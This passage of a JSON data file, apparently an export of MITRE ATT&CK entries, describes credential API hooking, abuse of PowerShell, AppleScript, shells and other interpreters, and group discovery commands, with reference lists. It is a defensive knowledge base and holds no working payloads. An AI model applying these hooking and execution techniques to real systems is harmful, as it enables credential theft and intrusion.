      {
        "source_name": "Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017",
        "url": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918",
        "description": "Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hook Overview",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx",
        "description": "Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Adlice Software IAT Hooks Oct 2014",
        "url": "https://www.adlice.com/userland-rootkits-part-1-iat-hooks/",
        "description": "Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MWRInfoSecurity Dynamic Hooking 2015",
        "url": "https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/",
        "description": "Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "HighTech Bridge Inline Hooking Sept 2011",
        "url": "https://www.exploit-db.com/docs/17802.pdf",
        "description": "Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Detecting Hooks Sept 2012",
        "url": "https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html",
        "description": "Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "PreKageo Winhook Jul 2011",
        "url": "https://github.com/prekageo/winhook",
        "description": "Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Jay GetHooks Sept 2011",
        "url": "https://github.com/jay/gethooks",
        "description": "Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Zairon Hooking Dec 2006",
        "url": "https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/",
        "description": "Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "EyeofRa Detecting Hooking June 2017",
        "url": "https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/",
        "description": "Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GMER Rootkits",
        "url": "http://www.gmer.net/",
        "description": "GMER. (n.d.). GMER. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Snapshot",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx",
        "description": "Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "StackExchange Hooks Jul 2012",
        "url": "https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis",
        "description": "Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6",
    "platform": "windows",
    "tid": "T1056.004",
    "technique": "Credential API Hooking",
    "tactic": "credential-access",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|loaded-dlls|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike <a href=\"https://attack.mitre.org/techniques/T1056/001\">Keylogging</a>,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <strong>Hooks procedures</strong>, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted -->* <strong>Import address table (IAT) hooking</strong>, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Endgame Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)<!-- raw HTML omitted -->* <strong>Inline hooking</strong>, which overwrites the first bytes in an API function to redirect code flow.(Citation: Endgame Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017",
        "url": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918",
        "description": "Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hook Overview",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx",
        "description": "Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Adlice Software IAT Hooks Oct 2014",
        "url": "https://www.adlice.com/userland-rootkits-part-1-iat-hooks/",
        "description": "Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MWRInfoSecurity Dynamic Hooking 2015",
        "url": "https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/",
        "description": "Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "HighTech Bridge Inline Hooking Sept 2011",
        "url": "https://www.exploit-db.com/docs/17802.pdf",
        "description": "Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Detecting Hooks Sept 2012",
        "url": "https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html",
        "description": "Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "PreKageo Winhook Jul 2011",
        "url": "https://github.com/prekageo/winhook",
        "description": "Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Jay GetHooks Sept 2011",
        "url": "https://github.com/jay/gethooks",
        "description": "Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Zairon Hooking Dec 2006",
        "url": "https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/",
        "description": "Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "EyeofRa Detecting Hooking June 2017",
        "url": "https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/",
        "description": "Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GMER Rootkits",
        "url": "http://www.gmer.net/",
        "description": "GMER. (n.d.). GMER. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Snapshot",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx",
        "description": "Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "StackExchange Hooks Jul 2012",
        "url": "https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis",
        "description": "Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
    "platform": "windows",
    "tid": "T1059.001",
    "technique": "PowerShell",
    "tactic": "execution",
    "datasources": "dll-monitoring|file-monitoring|loaded-dlls|powershell-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <!-- raw HTML omitted -->Start-Process<!-- raw HTML omitted --> cmdlet which can be used to run an executable and the <!-- raw HTML omitted -->Invoke-Command<!-- raw HTML omitted --> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).<!-- raw HTML omitted --><!-- raw HTML omitted -->PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.<!-- raw HTML omitted --><!-- raw HTML omitted -->A number of PowerShell-based offensive testing tools are available, including <a href=\"https://attack.mitre.org/software/S0363\">Empire</a>,  <a href=\"https://attack.mitre.org/software/S0194\">PowerSploit</a>, <a href=\"https://attack.mitre.org/software/S0378\">PoshC2</a>, and PSAttack.(Citation: Github PSAttack)<!-- raw HTML omitted --><!-- raw HTML omitted -->PowerShell commands/scripts can also be executed without directly invoking the <!-- raw HTML omitted -->powershell.exe<!-- raw HTML omitted --> binary through interfaces to PowerShell’s underlying <!-- raw HTML omitted -->System.Management.Automation<!-- raw HTML omitted --> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet PowerShell",
        "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx",
        "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Github PSAttack",
        "url": "https://github.com/jaredhaight/PSAttack",
        "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sixdub PowerPick Jan 2016",
        "url": "http://www.sixdub.net/?p=367",
        "description": "Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SilentBreak Offensive PS Dec 2015",
        "url": "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
        "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft PSfromCsharp APR 2014",
        "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
        "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye PowerShell Logging 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html",
        "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb",
    "platform": "macos",
    "tid": "T1059.002",
    "technique": "AppleScript",
    "tactic": "execution",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.<!-- raw HTML omitted --><!-- raw HTML omitted -->Scripts can be run from the command-line via <!-- raw HTML omitted -->osascript /path/to/script<!-- raw HTML omitted --> or <!-- raw HTML omitted -->osascript -e “script here”<!-- raw HTML omitted -->. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <!-- raw HTML omitted -->#!/usr/bin/osascript<!-- raw HTML omitted --> to the start of the script file.(Citation: SentinelOne AppleScript)<!-- raw HTML omitted --><!-- raw HTML omitted -->AppleScripts do not need to call <!-- raw HTML omitted -->osascript<!-- raw HTML omitted --> to execute, however. They may be executed from within mach-O binaries by using the macOS <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a>s <!-- raw HTML omitted -->NSAppleScript<!-- raw HTML omitted --> or <!-- raw HTML omitted -->OSAScript<!-- raw HTML omitted -->, both of which execute code independent of the <!-- raw HTML omitted -->/usr/bin/osascript<!-- raw HTML omitted --> command line utility.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they’re already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a>s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team). Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via <a href=\"https://attack.mitre.org/techniques/T1059/006\">Python</a>.(Citation: Macro Malware Targets Macs)</p>\n",
    "technique_references": [
      {
        "source_name": "Apple AppleScript",
        "url": "https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html",
        "description": "Apple. (2016, January 25). Introduction to AppleScript Language Guide. Retrieved March 28, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "SentinelOne AppleScript",
        "url": "https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/",
        "description": "Phil Stokes. (2020, March 16). How Offensive Actors Use AppleScript For Attacking macOS. Retrieved July 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "SentinelOne macOS Red Team",
        "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
        "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Macro Malware Targets Macs",
        "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/",
        "description": "Yerko Grbic. (2017, February 14). Macro Malware Targets Macs. Retrieved July 8, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
    "platform": "windows",
    "tid": "T1059.003",
    "technique": "Windows Command Shell",
    "tactic": "execution",
    "datasources": "process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the Windows command shell for execution. The Windows command shell (<!-- raw HTML omitted -->cmd.exe<!-- raw HTML omitted -->) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. <!-- raw HTML omitted --><!-- raw HTML omitted -->Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may leverage <!-- raw HTML omitted -->cmd.exe<!-- raw HTML omitted --> to execute various commands and payloads. Common uses include <!-- raw HTML omitted -->cmd.exe /c<!-- raw HTML omitted --> to execute a single command, or abusing <!-- raw HTML omitted -->cmd.exe<!-- raw HTML omitted --> interactively with input and output forwarded over a command and control channel.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56",
    "platform": "macos|linux",
    "tid": "T1059.004",
    "technique": "Unix Shell",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with <a href=\"https://attack.mitre.org/techniques/T1021/004\">SSH</a>. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "DieNet Bash",
        "url": "https://linux.die.net/man/1/bash",
        "description": "die.net. (n.d.). bash(1) - Linux man page. Retrieved June 12, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple ZShell",
        "url": "https://support.apple.com/HT208050",
        "description": "Apple. (2020, January 28). Use zsh as the default shell on your Mac. Retrieved June 12, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
    "platform": "windows|macos|linux",
    "tid": "T1059.005",
    "technique": "Visual Basic",
    "tactic": "execution",
    "datasources": "dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> and the <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a> through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)<!-- raw HTML omitted --><!-- raw HTML omitted -->Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of <a href=\"https://attack.mitre.org/techniques/T1059/007\">JavaScript/JScript</a> on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into <a href=\"https://attack.mitre.org/techniques/T1566/001\">Spearphishing Attachment</a> payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "VB .NET Mar 2020",
        "url": "https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/",
        "description": ".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VB Microsoft",
        "url": "https://docs.microsoft.com/dotnet/visual-basic/",
        "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft VBA",
        "url": "https://docs.microsoft.com/office/vba/api/overview/",
        "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia VBA",
        "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
        "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft VBScript",
        "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
        "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
    "platform": "linux|windows|macos",
    "tid": "T1059.006",
    "technique": "Python",
    "tactic": "execution",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <!-- raw HTML omitted -->python.exe<!-- raw HTML omitted --> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.<!-- raw HTML omitted --><!-- raw HTML omitted -->Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
    "platform": "windows|macos|linux",
    "tid": "T1059.007",
    "technique": "JavaScript/JScript",
    "tactic": "execution",
    "datasources": "dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)<!-- raw HTML omitted --><!-- raw HTML omitted -->JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a> or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of <a href=\"https://attack.mitre.org/techniques/T1027\">Obfuscated Files or Information</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "NodeJS",
        "url": "https://nodejs.org/",
        "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "JScrip May 2018",
        "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
        "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft JScript 2007",
        "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript",
        "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Windows Scripts",
        "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces",
        "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--818302b2-d640-477b-bf88-873120ce85c4",
    "platform": "network",
    "tid": "T1059.008",
    "technique": "Network Device CLI",
    "tactic": "execution",
    "datasources": "network-device-command-history|network-device-configuration|network-device-logs|network-device-run-time-memory",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. <!-- raw HTML omitted --><!-- raw HTML omitted -->Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or secure shell (SSH).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection. (Citation: Cisco Synful Knock Evolution)</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Command History",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b",
    "platform": "linux|macos|windows",
    "tid": "T1069.001",
    "technique": "Local Groups",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.<!-- raw HTML omitted --><!-- raw HTML omitted -->Commands such as <!-- raw HTML omitted -->net localgroup<!-- raw HTML omitted --> of the <a href=\"https://attack.mitre.org/software/S0039\">Net</a> utility, <!-- raw HTML omitted -->dscl . -list /Groups<!-- raw HTML omitted --> on macOS, and <!-- raw HTML omitted -->groups<!-- raw HTML omitted --> on Linux can list local groups.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c",
    "platform": "linux|macos|windows",
    "tid": "T1069.002",
    "technique": "Domain Groups",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
